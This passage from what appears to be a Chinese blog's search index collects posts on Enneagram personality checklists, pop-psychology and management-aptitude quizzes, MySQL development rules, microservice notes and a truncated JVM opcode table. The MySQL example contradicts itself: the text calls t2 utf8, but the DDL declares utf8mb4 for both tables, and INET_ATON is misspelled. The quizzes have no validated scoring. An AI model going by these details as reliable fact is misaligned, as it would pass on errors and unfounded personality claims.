1．肯努力改正自己的缺点。\n　　2．如果事物没有按顺序编排，就会感到焦躁。\n　　3．想避免时间或交际上的浪费。\n　　4．经常责怪自己或周遭的人，觉得可以做得更好。\n　　5．即使是小错误或小缺点，也会耿耿于怀。<!-- more -->\n　　6．拙于放松，不能轻易地开玩笑或闲聊。\n　　7．在脑子里以自己的量尺评判他人。\n　　8．比别人容易忧心、挂虑。\n　　9．对所有的事情都宁愿坦率、老实一点。\n　　10．不愿做有违人伦，包括说谎及欺骗的事。\n　　11．认为事情正确才是最重要的。\n　　12．虽然该做的事很多，但时间总是不够，常被时间追着跑。\n　　13．经常仔细核对自己如何分配、使用时间。\n　　14．行事中规中矩，又很实际，可是很胆怯。\n　　15．嫉恶如仇，不肯轻易饶恕。\n　　16．如果事情不公正，就会苦恼、困惑。\n　　17．上进心强，认为一定要出人头地。\n　　18．认为在受到他人肯定之前，自己必须先做得完美。\n　　19．经常被欲求、不满驱使，认为自己或他人都不够完美。\n　　20．以对错、好坏的标准看待事物。\n\n---\n\n　　◎2号型人格助人型\n　　1．觉得有许多人依赖自己。\n　　2．认为为他人奉献很重要。\n　　3．经常想“成为对众人有用的人”。\n　　4．希望得到众人的好感。\n　　5。经常说话博取他人欢心。\n　　6．看到他人受困，或立场痛苦，就想伸出援手。\n　　7．不论是否喜欢，眼前有谁就照顾谁。\n　　8．希望每个人都找自己寻求安慰，得到自己的建议。\n　　9．虽然受人依赖会感到高兴，但被依赖过度也会觉得是负担。\n　　10．最后才考虑自己的好处。\n　　11．常觉得为别人尽力，却得不到感谢。\n　　12．经常有“想待在某人身边”的感觉。\n　　13．自以为当然会受到感谢却未得到时，就会觉得自己是牺牲者。\n　　14．强烈觉得“爱人与被爱是人生中最重要的事”。\n　　15．与他人心意相通时，就会感到喜悦。\n　　16．认为通过为他人尽力的行为，可以使自己在那个人的人生中占有重要地位。\n　　17．看到他人因为自己的帮助而成长时，就会很快乐。\n　　18．经常以自己的空闲时间为他人解困。\n　　19．因为在意别人对自己的看法，所以更在意别人。\n　　20．对周围人的反应很敏感。\n\n---\n\n　　◎3号型人格成就型\n　　1．喜欢有所事事。\n　　2．喜欢与伙伴一起工作，觉得自己要成为好伙伴。\n　　3．执行工作又正确又专业。\n　　4．为了完成事情，重视组织化、效率化，不肯有所浪费。\n　　5．经常认定自己会成功。\n　　6．明确订定目标，为了获得成果，会锁定自己现在该怎么做。\n　　7．喜欢以进度表、分数等，来表示自己完成的成绩。\n　　8．别人很羡慕我完成事情的行动力。\n　　9．想给他人自己成功的印象。\n　　10．虽然喜欢自行决定，但会随机应变而改变意见。\n　　11．为了达到目标，有时会与对手妥协。\n　　12．对现在所完成的事更有成就感。\n　　13．最讨厌听到别人说自己做得不理想。\n　　14．与继续做旧的事相比，倒更喜欢开始新的工作。\n　　15．被别人夸奖很有说服力。\n　　16．重视自己的工作、任务，觉得自己很能干。\n　　17．任何事情都想具体化。\n　　18．认为面对他人时，印象中有着众多成果是很重要的。\n　　19．被看成完成事物有自我主张的人。\n　　20．认为第一印象特别重要。\n\n---\n\n　　◎4号型人格自我型\n　　1．觉得很多人没有体会到人生真正的美丽与意味。\n　　2．对自己的过去有强烈的哀愁。\n　　3．经常想保持自己，不想做作，但并不容易。\n　　4．心灵会被象征性的事物吸引。\n　　5．觉得别人不像自己一样，对事物有深刻的感觉。\n　　6．认为别人很难了解自己的感觉。\n　　7．想时时保持礼貌、品味。\n　　8．对自己而言，周围的气氛很重要。\n　　9．认为人生如戏，自己正在舞台上表演。\n　　10．对自己而言，礼貌与好的兴趣是很重要的。\n　　11．不愿意承认自己是平凡人。\n　　12．想到失去、死亡、痛苦时，难免会陷入深思中。\n　　13．经常觉得难以用一般的方式表现自己的感情。\n　　14．认为如果太拘泥于自己的感受，在感情膨胀的时候，会不知道自己有什么样的感觉。\n　　15．对于人际关系的不理想，比他人更感到困惑。\n　　16．有时会觉得自己是悲剧的主角。\n　　17．曾被他人指责自以为是。\n　　18．希望感情有剧烈的起伏，即心情时而高扬，时而低迷，如果没有这样的极端，就觉得缺乏生气。\n　　19．艺术是自己表现感情时非常重要的手段。\n　　20．对于别人的批评，可以不予理会。\n\n---\n\n　　◎5号型人格理智型\n　　1．拙于表现自己的感情。\n　　2．有收集物品的习惯，认为有一一天会派上用场。\n　　3．对于言不及义的交谈最棘手。\n　　4．擅长综合观察，或是综合各种意见。\n　　5．被人问及“现在有什么感受”时，就会无言以对。\n　　6．在日常生活中，希望有私隐的时间和场所可以放松。\n　　7．认为与其由自己打头阵，不如委任他人去做。\n　　8．有在自己直接参与前，先观察他人动作的倾向。\n　　9．喜欢可以避开他人的独处时间。\n　　10．认为自己比别人安静。\n　　11．拙于主动向他人搭讪。\n　　12．发生问题时，认为由自己解决会更好。\n　　13．认为拙于自我主张。\n　　14．喜欢以思考解决问题。\n　　15．喜欢纵观全体，掌握状况再做判断，如果有所遗漏，就会觉得自己太轻率了，责备自己的疏失。\n　　16．认为自己对时间及金钱很吝啬。\n　　17．如果得不到与付出成正比的报酬，就会感到不满。\n　　18．如果自己引起麻烦，就会认为自己“太蠢了”。\n　　19．别人有时会认为我说话太小声，而被要求“讲话大声一点”。\n　　20．从他人处“得到的资讯”比“给人的资讯”多。\n\n---\n\n　　◎6号型人格疑惑型\n　　1．在某种权威者的身边，就会变得神经质。\n　　2．经常因为疑惑而感到痛苦。\n　　3．想有明确的指标，能熟知自己的立场。\n　　4．时时提高警戒，不敢对危险掉以轻心。\n　　5．事情想得太认真。\n　　6．经常反问自己是不是做错了事。\n　　7．经常觉得别人的批评是一种攻击。\n　　8．经常犹豫不决，很在意自己的配偶或伙伴的想法。\n　　9．只要有意愿，即使为工作粉身碎骨也在所不惜。\n　　10．朋友认为我为人老实，愿意帮助、鼓励及体贴他人。\n　　11．别人常说我有很好的幽默感。\n　　12．如果不是恪遵规定，就是经常打破规则。\n　　13．在亲密的关系中，如果站在弱势的一方，就会变得担心、易怒。\n　　14．做事走极端，不是一拖再拖；就是向前直冲，甚至有冲人危险的倾向。\n　　15．可以一眼看出那些想以外交辞令来操纵自己的人。\n　　16．喜欢能预测事情。\n　　17．认为是自己本身妨碍了自己的成功。\n　　18．不论对方好坏，都会一直支援他。\n　　19．觉得要将自己弄得整整齐齐，才能相对地觉得可以控制自己的生活。\n　　20．不喜欢自大之人或野心分子。\n\n---\n\n　　◎7号型人格活跃型\n　　1．与他人相比之下，比较不会怀疑别人，或探求他人的动机。\n　　2．喜欢任何快乐的事。\n　　3．经常抱着事物会朝好的方向展开的心态。\n　　4．对于别人不能像我一样有开朗的心情而感到遗憾。\n　　5．不太关心别人的想法，经常觉得自己是幸福的。\n　　6．经常看事物的光明面，不愿看人生的黑暗面。\n　　7．对于接触的人不太怀有敌意。\n　　8．喜欢说笑或开朗的谈话，不喜欢黯淡的言论。\n　　9．自认为童心未泯，是个开朗的人。\n　　10．在派对时喜欢引人注意。\n　　11．‘见树不见林”真是困扰，认为事物应该以更宽广的视野掌握才对。\n　　12．强烈认为“好”还要“更好”。\n　　13．认为伤心事应该早早忘记。\n　　14．宁愿对黑暗的现实视而不见，愿意对任何事说“棒极了”。\n　　15．与其辛苦过着“有韵味的人生”，不如过着“充满快乐的人生”。\n　　16．对于未来从不失去热情。\n　　17．喜欢每个人都很开朗。\n　　18．即使勉强一点，也要尽量避免“讨厌”的事。\n　　19．比起专心于一件事，更容易不断转移关心的目标。\n　　20．能回想起自己童年时代的幸福。\n\n---\n\n　　◎8号型人格领袖型\n　　1．愿意为了自己的需要而作战，会断然固守必要的事物。\n　　2．可以立刻找出他人的弱点，对手一旦挑战，就立即攻击这个弱点。\n　　3．经常对于事物表现不满。\n　　4．不怕与他人对立，事实上也经常对立。\n　　5．觉得行使权力很痛快。\n　　6．一眼就可以看出是谁在一个群体中握有权力。\n　　7．自认为是富有攻击性，自我主张强的人。\n　　8．知道事情该怎么做。\n　　9．既不能容忍，也不愿意表现出自己高尚、温柔的“女性的一面”。\n　　10．不屑退缩，而喜欢到处活动。\n　　11．对自己而言，贯彻仁义、道理是很重要的问题。\n　　12．凡是在自己的权威之下的人，都会保护他们。\n　　13．自认为是“朴实”的人。\n　　14．一般而言，不太关心自我反省、自我分析。\n　　15．认为自己是不会顺从他人的人。\n　　16．讨厌别人多管闲事。\n　　17．讨厌别人指责、纠正自己。\n　　18．自认为工作很努力。\n　　19．不会放任事物不管，必定会加以纠正。\n　　20．认为别人的麻烦都是自找的。\n\n---\n\n　　◎9号型人格平和型\n　　1．我觉得许多人都太在意事物了。\n　　2．认为人生处处是青山，很少会遇到狼狈的现象。\n　　3．大多数时候，都很平稳平静。\n　　4．最喜欢无所事事。\n　　5．认为自己是极为乐天派的人。\n　　6．想不出上一次的失眠是何时。\n　　7．认为几乎所有的人都有或多或少的不同，但大致上是相同的。\n　　8．对于事物通常不会太兴奋。\n　　9．从不会觉得亟不可待，从未有不能等到明天的心情。\n　　10．开始做事时，需要外来的刺激。\n　　11．对于任何事都讨厌浪费气力，做事时会考虑节约力气。\n　　12．心态一向是“不要拿芝麻小事来烦我”。\n　　13．认为自己是不会感情用事的冷静裁断者，对任何一方都一视同仁。\n　　14．最讨厌半途而废，定不下心来。\n　　15．通常会选择抵抗的途径。\n　　16．认为自己是个稳重的人。\n　　17．为了使人人平和，而配合对方的行动。\n　　18．不认为自己是多么重要的人。\n　　19．拙于听人说话，或注意他人。\n　　20．赞成“船到桥头自然直，忍一时风平浪静，退一步海阔天空”的想法。\n\n","categories":["读书笔记"],"tags":["读书笔记","心理学","九型人格"]},{"title":"解密九型人格读书笔记（4） | 测验一下你的性格","url":"/2020/10/jiu-xing-ren-ge-004/","content":"\n　　1．你认为你是一个有个性、有自己的思想及主见的人吗？\n　　是（请回答问题2）\n　　否（请回答问题8）\n　　2．你比较喜欢星形还是心形的项链呢？\n　　星形（请回答问题3）\n　　心形（请回答问题9）\n　　3．你喜欢玩洋娃娃或机器人吗？\n　　喜欢（请回答问题11）\n　　不喜欢（请回答问题4）<!-- more -->\n　　4．你对中国的传统服饰有兴趣吗？\n　　有兴趣（请回答问题11）\n　　没有太大兴趣（请回答问题5）\n　　5．你的衣柜里有红色的衣服吗？\n　　有（请回答问题6）\n　　没有（请回答问题12）\n　　6．你愿意申请一份需要工作经验的职位吗？\n　　愿意（请回答问题7）\n　　不愿意（请回答问题13）\n　　7．你受到朋友的欢迎，是否因为你是一个可靠的人呢？\n　　是（你属于a型）\n　　否（你属于b型）\n　　8．你是短头发吗？\n　　是（请回答问题2）\n　　否（请回答问题15）\n　　9．你是否觉得你的肤色不够白皙呢？\n　　是（请回答问题3）\n　　否（请回答问题16）\n　　10．请从下列两种花中选择你较喜欢的一种：\n　　向日葵（请回答问题14）\n　　野菊花（请回答问题11）\n　　11．你是否是一个有责任心的学生或职员呢？\n　　是（请回答问题5）\n　　否（请回答问题17）\n　　12．你最近对手工艺有兴趣吗？\n　　有兴趣（请回答问题18）\n　　没有兴趣（请回答问题6）\n　　13．你认为你是一个亲切友善的人吗？\n　　是（请回答问题7）\n　　否（请回答问题19）\n　　14．你介意与一群异性朋友睡在相同的一张床上吗？\n　　介意（请回答问题20）\n　　不介意（你是属于a型）\n　　15．运动是否是你主要的课余活动呢？\n　　是（请回答问题9）\n　　否（请回答问题21）\n　　16．你对理科有兴趣吗？\n　　有兴趣（请回答问题10）\n　　没有兴趣（请回答问题22）\n　　17．请从下列两种颜色中选择你较喜欢的一种：\n　　橙／橘色（请回答问题12）\n　　红色（请回答问题24）\n　　18．你较喜欢山还是海洋呢？\n　　山（请回答问题13）\n　　海洋（请回答问题25）\n　　19．你会妒忌比你出色的人吗？\n　　会（请回答问题14）\n　　不会（请回答问题26）\n　　20．你介意在公众场所大笑或大声谈话吗？\n　　介意（你属于c型）\n　　不介意（你属于b型）\n　　21．你会经常收拾你的房间吗？\n　　会（请回答问题16）\n　　不会（请回答问题28）\n　　22．你喜欢看体育节目吗？\n　　喜欢（请回答问题23）\n　　不喜欢（请回答问题29）\n　　23．你认为纯友谊关系能够在异性朋友在之间存在吗？\n　　能够（请回答问题17）\n　　不能够（请回答问题10）\n　　24．你想学习烹饪吗？\n　　想（请回答问题18）\n　　不想（请回答问题31）\n　　25．你对互联网有兴趣吗？\n　　有兴趣（请回答问题19）\n　　没有太大兴趣（请回答问题32）\n　　26．你较喜欢下列哪一种性格的人呢？\n　　运动型（请回答问题20）\n　　成熟型（请回答问题39）\n　　27．你喜欢穿着及炫耀名牌时装吗？\n　　喜欢（你属于b型）\n　　不喜欢（你属于d型）\n　　28．你较喜欢狗还是猫呢？\n　　狗（请回答问题22）\n　　猫（请回答问题34）\n　　29．你通常会携带香水上街吗？\n　　会（请回答问题30）\n　　不会（请回答问题35）\n　　30．你较喜欢太阳还是月亮？\n　　月亮（请回答问题23）\n　　太阳（请回答问题24）\n　　31．你经常改变你的发型吗？\n　　是（请回答问题25）\n　　否（请回答问题27）\n　　32．服务他人令你觉得很忙碌吗？\n　　是（请回答问题26）\n　　否（请回答问题38）\n　　33．你通常保持整齐的头发吗？\n　　是（请回答问题27）\n　　否（你属于c型）\n　　34．你有烹饪恐惧症吗？\n　　有（请回答问题29）\n　　没有（请回答问题35）\n　　35．你是否拥有很多装饰品呢？\n　　是（请回答问题36）\n　　否（请回答问题37）\n　　36．你喜欢在假期或节日期间购物吗？\n　　喜欢（请回答问题37）\n　　不喜欢（请回答问题31）\n　　37．将来你希望制造雕像吗？\n　　希望（请回答问题32）\n　　不希望（请回答问题38）\n　　38．你十分挑剔你内衣裤的款式吗？\n　　是（请回答问题40）\n　　否（请回答问题39）\n　　39．你对制造手工艺有兴趣吗？\n　　有兴趣（请回答问题33）\n　　没兴趣（请回答问题27）\n　　40．你是否是一个追随时装潮流的人呢？\n　　是（你属于c型）\n　　否（你属于d型）\n\n---\n\n　　◇测试答案：\n　　a型：你是一个外向和乐观的人。虽然你也有遭遇挫折失败时候，但开朗的你很快便会振作起来。异性朋友很喜欢你亲切且友善的性格，但也同时会令你的配偶失去安全感。不懂表达感情是你的缺点，但宽容、大量及慷慨是你受欢迎的原因。同性朋友很难了解你，因为你性格天真单纯，但这正是你吸引异性的有利条件。\n　　b型：\n　　你关怀照料的性格总是令朋友们觉得你是他们的大哥哥或大姐姐。朋友们都很信任你，他们觉得与你聊天很舒服，并且是一种乐趣。通常一些年纪比你小而且感情脆弱的异性都会受你吸引。\n　　c型：\n　　你是一个有依赖性及欠缺主见的人，因此异性朋友总是觉得你是他们的小弟弟或小妹妹。在四个类型之中，你是最适合结婚的一类。你能成功地占据配偶空闲的时间。你总希望你是众人的集中点。楚楚可怜是你给异性的印象，因此朋友们都热心地保护及照顾你。穿着清洁整齐的衣服能令你更加受欢迎。\n　　d型：\n　　在四个类型之中，你是最性感的一类。妩媚迷人的你很受朋友们的欢迎，而且更是众人的集中点。可是，朋友们往往只是宠爱你的外貌，所以不要过分信任异性的甜言蜜语。另外，希望你能够多些表现你的智慧及主见，这样你便能成为一个外在及内在美兼备的人。","categories":["读书笔记"],"tags":["读书笔记","心理学","九型人格"]},{"title":"解密九型人格读书笔记（5） | 你适不适合搞管理？","url":"/2020/10/jiu-xing-ren-ge-005/","content":"\n◇测验一：假如你已知道你的生活将发生如下变化，是否仍能愉快地从事管理工作？\n\n　　1．你将越来越多地涉及管理，而和技术的联系越来越少。\n　　2．一旦决定搞管理，就不能半途而废。即使你想再去搞技术，也是办不到的，因为技术的前进太迅速了。\n　　3．你将从一个可靠的领域，即一个对自己所做的事隋有把握的领域，转向一个无论从可利用的人力还是工作条件都无把握的领域。<!-- more -->\n　　4．你必须大大扩大知识面和兴趣范围，丝毫不能将兴趣集中于一点或致力于一个专业。5．你必须放弃你在专业上所取得的成绩，而为自己能渐渐支配更多的人，组织越来越多的活动及能够帮助其他专业人员取得成功而感到满足。\n\n◇测验二：\n\n　　1．如果让你选择不同于现在工作的一个职业，你喜欢做一个：\n　　a．医生\n　　b．勘探员\n　　2．你喜欢读关于哪一方面的书？\n　　a．地理学\n　　b．心理学\n　　3．你喜欢怎样度过一个夜晚？\n　　a．做新家具\n　　b．和朋友做游戏\n　　4．如果某人耽误你的时间，怎么办呢？\n　　a．总是很耐心\n　　b．往往会发火\n　　5．你喜欢做哪件事？\n　　a．会见陌生人\n　　b．看展览\n　　6．你喜欢别人称你：\n　　a．善于合作\n　　b．机智多谋\n　　7．每样东西都有放处且各就各位，这对你：\n　　a．很重要\n　　b．不怎么重要\n　　8．如果你强烈反对某个人，将怎么办？\n　　a．力求最大的统一，使争论最少\n　　b．将在价值、原则及政策上争论个水落石出\n　　9．你是否能容易地放下正在阅读的一个很有趣的故事？\n　　a．能\n　　b．不能\n　　10．在一出戏中，你喜欢演哪个角色？\n　　a．富兰克林\n　　b．约瑟夫（政治家）\n　　c．查理斯·凯特玲（工程师，电机的发明人）\n\n◇测验三：\n\n　　1．你做出的从事管理工作的决定，是否与你的能力、兴趣、品质、个性和目标相一致？是否能比你从事技术工作更加可以施展你的才能？\n　　2．你是否具有从事管理工作的较强的能力和必要的条件？是否期待将来亲身投入管理工作中去？\n　　3．你肯定管理工作能使自己得到个人心理上的更大满足吗？\n　　4．你是否对本企业的情况有一个全面的了解？你熟悉你所在企业的不同部门的不同要求和不同管理方法吗？是否很容易从这一部门转到另一部门呢？\n　　5．你已确立了今后5～10年的奋斗目标了吗？你肯定现在的工作更能达到你的目的吗？你意识到在管理阶层中，存在更强有力的竞争吗？你肯定自己能充分地正视这些竞争吗？\n　　6．你是否更注重人而不是工作？你更喜欢和别人工作在一起吗？你能很容易地找到合作者吗？你自愿帮助别人吗？你真正知道人们为什么在社会中如此表现吗？\n　　7．你的同事和朋友认为你友好和随和吗？假如你已意识到帮助别人时要牺牲个人利益，是否仍执意这样做？朋友请教你吗？你愿意得到别人的帮助吗？\n　　8．你能在变化莫测的情况下灵活处事，在一时混乱的情况下泰然处之吗？当所有的情况都不能如愿以偿时，你仍能快活吗？当对自己决定的后果尚无把握时，你觉得烦躁不安吗？\n　　9．你是否觉得信任他人且他人信任你？你能很容易地消除隔阂吗？\n　　10．你在工作中注重人和主观因素吗？你注重利用他人吗？你同样注重自己的下级吗？\n　　11．你是否注意自己的行为且试图解释过？你是否有时听见自己的言论像是来自别人的观点？你曾努力从别人的立场出发来寻求看待事物的方式吗？\n　　12．你觉得自己很善于广泛接触各种各样的人，并在使用人时尽可能发挥他们的作用吗？\n\n---\n\n　　◇测试答案\n　　测验一：如果你的生活发生上述的四到五种变化仍能适应，那么你适合于管理工作。\n　　测验二：适于搞管理工作的人有如下列回答：1a，2b，3b，4a，5a，6a，7a，8a，9a，10a。\n　　测验三：在上述12个问题中，你有6个以上回答“是”吗？如果是的话，那你就有可能并有能力领导一个棘手的企业。\n\n","categories":["读书笔记"],"tags":["读书笔记","心理学","九型人格"]},{"title":"MySQL核心应用开发规范","url":"/2020/10/mysql-he-xin-ying-yong-kai-fa-gui-fan/","content":"\nMySQL核心应用开发规范总结起来有三点：表越窄越好，表越小越好，请求够高效，接下来详细解释一下这三点。\n\n## 表越窄越好\n设计表字段的时候，选择的数据类型够用就行。\n\n- 存储账号名（长度≤30）就没必要 varchar(255)\n- Unix时间戳，可以使用无符号整型（INT UNSIGNED）\n- IPv4地址，也可以使用无符号整型（INET_AOTN()和INET_NTOA()函数）\n\n可以通过执行 show table status 来查看表的统计信息：\n- Avg_row_length 值超过100字节\n- Data_free 值大于0说明表存在碎片\n\n<!-- more -->\n## 表越小越好\n\n真正“好”的架构：\n- 让我们线上的业务表，它的数据量尽可能小\n- 热表数据量足够小，IO操作代价更小（分库分表，冷热数据分离，窄表5000万，宽表50万）\n\n## 请求够高效\n事务要尽快的提交/回滚\n\n修改/删除数据 ——> 锁定数据行\n\n表锁 未释放导致其他SQL或事务被阻塞\n\n捕获长时间未提交的SQL或事务\n- 监控MySQL的线程状态\n- 监控InnoDB的事务状态\n- 设置时长超过5秒告警\n- 设置锁表行数大于10告警\n- 检查或者监控SQL注入的风险（SLEEP()函数，UNION ALL请求）\n\n## 其他重要细节\n\n### schema设计原则\n\n1.尽量小的原则\n2.禁止使用外键——增加行锁\n3.自增INT/BIGINT主键（InnoDB引擎表如果使用char或者uuid作为主键，会导致数据存储的顺序离散随机，影响性能）\n4.字符集和库表的设计要一致，MySQL实例，database，table，column，存储过程，event，都要保持一致\n5.MySQL尽量高效的建议\n  - 单表\n    - ①单表的数据量尽量不要超过5000万\n    - ②单表的物理大小尽量不要超过20G\n    - ③索引的数量不要超过5个\n  - 实例\n    - ①总的大小不要超过500G\n    - ②总表数量不要超过5000个（包含分区）\n    \n有一个例子是t1表是utf8mb4编码（四个字节），t2是utf8编码（三个字节）\n\n\n```sql\nCREATE TABLE `t1` (\n  `id` bigint(20) NOT NULL AUTO_INCREMENT,\n  `c1` int(10) unsigned NOT NULL DEFAULT '0',\n  `c2` varchar(270) NOT NULL DEFAULT '',\n  `c3` varchar(30) NOT NULL DEFAULT '',\n  `c4` varchar(40) NOT NULL DEFAULT '',\n  PRIMARY KEY(`id`),\n  KEY `int_col` (`c1`),\n  KEY `char_col` (`c2`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;\n\nCREATE TABLE `t2` (\n  `id` bigint(20) NOT NULL AUTO_INCREMENT,\n  `c1` int(10) unsigned NOT NULL DEFAULT '0',\n  `c2` varchar(270) NOT NULL DEFAULT '',\n  `c3` varchar(30) NOT NULL DEFAULT '',\n  `c4` varchar(40) NOT NULL DEFAULT '',\n  PRIMARY KEY(`id`),\n  KEY `int_col` (`c1`),\n  KEY `char_col` (`c2`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;\n```\n\n当两个表做join时，select t1 后c2是4个字节的编码，带入t2后，无法使用索引。\n\n```sql\nmysql> desc select * from t1 left join t2 on t1.c2 = t2.c2 where t1.id > 500;\n+----+-------------+-------+------------+-------+---------------+---------+---------+------+------+----------+----------------------------------------------------+\n| id | select_type | table | partitions | type  | possible_keys | key     | key_len | ref  | rows | filtered | Extra                                              |\n+----+-------------+-------+------------+-------+---------------+---------+---------+------+------+----------+----------------------------------------------------+\n|  1 | SIMPLE      | t1    | NULL       | range | PRIMARY       | PRIMARY | 8       | NULL |    1 |   100.00 | Using where                                        |\n|  1 | SIMPLE      | t2    | NULL       | ALL   | NULL          | NULL    | NULL    | NULL |    1 |   100.00 | Using where; Using join buffer (Block Nested Loop) |\n+----+-------------+-------+------------+-------+---------------+---------+---------+------+------+----------+----------------------------------------------------+\n2 rows in set, 1 warning (0.01 sec)\n```\n\n当把t2的编码也改成utf8mb4后，可以正常使用索引。\n\n```sql\nmysql> desc select * from t1 left join t2 on t1.c2 = t2.c2 where t1.id > 500;                                                                                           +----+-------------+-------+------------+-------+---------------+----------+---------+------------+------+----------+-------------+\n| id | select_type | table | partitions | type  | possible_keys | key      | key_len | ref        | rows | filtered | Extra       |\n+----+-------------+-------+------------+-------+---------------+----------+---------+------------+------+----------+-------------+\n|  1 | SIMPLE      | t1    | NULL       | range | PRIMARY       | PRIMARY  | 8       | NULL       |    1 |   100.00 | Using where |\n|  1 | SIMPLE      | t2    | NULL       | ref   | char_col      | char_col | 1082    | demo.t1.c2 |    1 |   100.00 | NULL        |\n+----+-------------+-------+------------+-------+---------------+----------+---------+------------+------+----------+-------------+\n2 rows in set, 1 warning (0.01 sec)\n```\n\n### 库表字段设计规范\n\n1.每个表建议不要超过50个字段\n2.优先选择utf8mb4字符集\n3.严谨在数据库中明文存储用户的一些核心数据（密码，身份证号等，自己定义加密算法）\n4.用好INT数据类型（UNSIGNED，金额用途——扩大N倍使用bigint）\n5.遇到大对象数据类型（BLOB、TEXT）字段，尽量拆出去，再用主键做关联\n6.字符类型尽可能使用varchar的数据类型（同长度更新）\n7.日期数据数据建议采用datetime数据类型（datetime类型 0000-9999年，timestamp类型 1970-2038）\n\n### SQL开发的建议\n\n1.多表JOIN时，JOIN列的数据类型要一致\n2.多表JOIN时，把过滤后结果集较小的表作为驱动表（或者使用 inner join 让优化器去做优化）\n3.在查询的where条件中用上函数或表达式要用8.0版本\n4.不要看到where条件中出现的列就直接创建索引\n5.尽可能不要去执行select *操作\n6.不要执行LIKE '%x%'\n7.尽可能不要用 \"!=\" 条件\n8.如果能确定返回结果数量的话最好加上 LIMIT N，优化器通常会再进一步优化，参考[LIMIT优化](https://dev.mysql.com/doc/refman/8.0/en/limit-optimization.html)\n9.优先使用UNION ALL，代替UNION\n10.所有的SQL都要通过SQL审核系统检查，符合标准后才能上线\n\n\n\n\n\n","categories":["学习笔记"],"tags":["MySQL","开发规范"]},{"title":"微服务基础设施搭建必做的 4 件事","url":"/2020/10/wei-fu-wu-ji-chu-she-shi-da-jian/","content":"\n## 分布式系统中进程如何通信\n由传统的函数调用变成跨网络的进程间通信(RPC)，通信中间件需要屏蔽复杂性，需要关注以下4点\n- 公司的多语言诉求（多种语言需要要避开语言绑定的RPC框架）\n- 性能方面 序列化协议\n- 业务长期演进中通信框架替换成本\n- 考虑通信框架背后的微服务组件生态是否完整（配置管理，服务发现，断路器，负载均衡）\n\nRPC通讯框架的4个实践经验：\n- 公司作战需要规范（趁早规范化、标准化）\n- 具备服务异常保护机制（a.过载保护，节点，接口等，b.异常故障压制，弱化依赖，默认值，降级）\n- 健壮的集群间容错策略（a.流量容错，b.调用端对端服务节点状态感知）\n- 多样的调用方式支持多样的业务场景（异步，OneWay）\n\n<!-- more -->\n## 服务集群中节点和流量如何管理\n问题一：单体应用中函数调用是基于内存中函数地址寻址，服务化后调用端如何找到对端节点？\n\n![服务注册中心原理图](https://up-img.yonghong.tech/pic/2020/10/24-16-48-IMG_0034-NbTskD.PNG)\n\n问题二：服务端扩容，调用端如何发现新节点并进行负载均衡？\n\n![服务扩容原理图](https://up-img.yonghong.tech/pic/2020/10/24-17-17-IMG_0035-DBxxWH.PNG)\n\n问题三：服务端个别节点宕机，如何自动使其失效避免调用端继续调用报错？\n\n![异常节点摘除原理图](https://up-img.yonghong.tech/pic/2020/10/24-17-17-IMG_0036-78o40S.PNG)\n\n场景一：单节点业务异常时，需要快速禁用异常节点。\n场景二：对于服务发布时灰度的节点，期望降低其流量比例。\n场景三：业务在多地域部署时，期望支持同地域优先级等个性化的路由策略。\n\n![路由策略原理图](https://up-img.yonghong.tech/pic/2020/10/24-17-17-IMG_0037-9Q0Knr.PNG)\n\n技术选型\n- 经验一：系统要适当弱化对注册中心的依赖\n- 经验二：趁早减少不必要的数据交互，规划扩容方案\n- 经验三：有限保证可用性而非一致性（注册中心定位为AP系统而非CP系统）\n\n## 系统复杂化后如何快速发现与定位异常\n分布式系统监控的三大利器：\n- 集中式的log日志系统\n- metrics指标系统\n- 分布式链路追踪tracing\n\n推荐文章：Metrics, tracing, and logging\n\n## 微服务拆分后团队组织如何变化\n\n问题：按技术能力组织团队，协作效率低、不聚集导致专业度有限\n\n建议：\n- 按业务职能组织团队，聚集所属业务与产品\n- 规模到一定程度，建设独立的基础技术团队\n\n---\n\n1024 程序员节快乐！","categories":["学习笔记"],"tags":["分布式","微服务","RPC"]},{"title":"JVM 指令集对照表","url":"/2021/01/jvm-instruction-set/","content":"\n在 Java Virtual Machine Specification 中，有对 JVM 指令集的详细描述，可以打开链接查看：\n- Java 11：https://docs.oracle.com/javase/specs/jvms/se11/html/jvms-6.html\n- Java 8：https://docs.oracle.com/javase/specs/jvms/se8/html/jvms-6.html\n\n也有人整理了一个对照表，记录在下面\n\n<!-- more -->\n\n| 字节码 | 助记符 | 指令含义 |\n| :---: | :---: | --- |\n| 0x00 | nop | None |\n| 0x01 | aconst_null | 将null推送至栈顶 |\n| 0x02 | iconst_m1 | 将int型-1推送至栈顶 |\n| 0x03 | iconst_0 | 将int型0推送至栈顶 |\n| 0x04 | iconst_1 | 将int型1推送至栈顶 |\n| 0x05 | iconst_2 | 将int型2推送至栈顶 |\n| 0x06 | iconst_3 | 将int型3推送至栈顶 |\n| 0x07 | iconst_4 | 将int型4推送至栈顶 |\n| 0x08 | iconst_5 | 将int型5推送至栈顶 |\n| 0x09 | lconst_0 | 将long型0推送至栈顶 |\n| 0x0a | lconst_1 | 将long型1推送至栈顶 |\n| 0x0b | fconst_0 | 将float型0推送至栈顶 |\n| 0x0c | fconst_1 | 将float型1推送至栈顶 |\n| 0x0d | fconst_2 | 将float型2推送至栈顶 |\n| 0x0e | dconst_0 | 将double型0推送至栈顶 |\n| 0x0f | dconst_1 | 将double型1推送至栈顶 |\n| 0x10 | bipush | 将单字节的常量值(-128~127)推送至栈顶 |\n| 0x11 | sipush | 将一个短整型常量(-32768~32767)推送至栈顶 |\n| 0x12 | ldc | 将int,float或String型常量值从常量池中推送至栈顶 |\n| 0x13 | ldc_w | 将int,float或String型常量值从常量池中推送至栈顶(宽索引) |\n| 0x14 | ldc2_w | 将long或double型常量值从常量池中推送至栈顶(宽索引) |\n| 0x15 | iload | 将指定的int型本地变量推送至栈顶 |\n| 0x16 | lload | 将指定的long型本地变量推送至栈顶 |\n| 0x17 | fload | 将指定的float型本地变量推送至栈顶 |\n| 0x18 | dload | 将指定的double型本地变量推送至栈顶 |\n| 0x19 | aload | 将指定的引用类型本地变量推送至栈顶 |\n| 0x1a | iload_0 | 将第一个int型本地变量推送至栈顶 |\n| 0x1b | iload_1 | 将第二个int型本地变量推送至栈顶 |\n| 0x1c | iload_2 | 将第三个int型本地变量推送至栈顶 |\n| 0x1d | iload_3 | 将第四个int型本地变量推送至栈顶 |\n| 0x1e | lload_0 | 将第一个long型本地变量推送至栈顶 |\n| 0x1f | lload_1 | 将第二个long型本地变量推送至栈顶 |\n| 0x20 | lload_2 | 将第三个long型本地变量推送至栈顶 |\n| 0x21 | lload_3 | 